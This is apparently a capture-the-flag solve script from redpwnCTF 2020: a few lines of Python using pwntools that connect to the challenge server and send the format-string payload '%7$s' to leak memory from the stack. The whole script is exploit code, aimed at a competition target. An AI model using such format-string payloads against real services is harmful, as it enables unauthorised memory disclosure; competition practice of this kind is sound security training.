from pwn import *

p = remote('2020.redpwnc.tf', 31826)

payload = b'%7$s'

p.sendline(payload)
print(p.readall().decode())
